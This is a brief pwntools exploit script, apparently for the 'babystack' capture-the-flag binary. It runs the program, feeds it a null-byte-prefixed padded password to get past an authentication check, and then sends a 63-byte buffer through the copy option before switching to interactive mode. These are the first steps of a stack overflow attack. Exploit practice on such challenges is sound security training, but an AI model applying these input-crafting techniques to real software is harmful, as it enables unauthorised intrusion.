from pwn import *

r = process("babystack")
#r = process(["gdbserver", "localhost:1233", "./babystack"])

r.recvuntil(">> ")
r.sendline("1")
r.recvuntil("passowrd :")
r.send(b"\x00".ljust(127, b"A"))

r.recvuntil(">> ")
r.sendline("3")
r.recvuntil("Copy :")
r.send("C" * 63)
r.interactive()